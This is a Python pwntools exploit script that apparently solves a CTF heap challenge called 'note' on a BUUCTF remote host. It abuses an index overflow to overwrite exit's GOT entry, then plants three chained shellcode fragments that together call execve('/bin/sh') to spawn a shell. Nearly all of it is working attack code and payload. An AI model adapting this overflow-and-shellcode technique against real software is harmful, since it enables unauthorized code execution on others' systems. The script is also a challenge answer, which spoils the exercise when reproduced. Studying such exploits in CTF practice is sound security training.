from pwn import *

context.log_level = "debug"
context.os = "linux"
context.arch = "amd64"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./note"
#libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("node4.buuoj.cn", 27151)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def add(index, size, content):
    io.sendline('1')
    sleep(0.01)
    io.sendline(str(index))
    sleep(0.01)
    io.sendline(size)
    sleep(0.01)
    io.sendline(content)


#溢出覆盖index，使得heap[i]对应exit的got表，这样就能将exit的got表修改为一个heap地址
payload = b'13'.ljust(0xA, b'\x00') + p32(0xFFFFFFF8)
sc1 = asm('''mov rax,0x0068732f6e69622f
             jmp $+0x16
          ''')
ddebug("b atoi")
add(0, payload, sc1)

sc2 = asm('''push rax
             xor rax,rax
             mov al,0x3B
             mov rdi,rsp
             jmp $+0x17
          ''')
add(1, '13', sc2)

sc3 = asm('''xor rsi,rsi
             xor rdx,rdx
             syscall
          ''')
add(2, '13', sc3)
#exit -> getshell
io.sendline('5')

io.interactive()
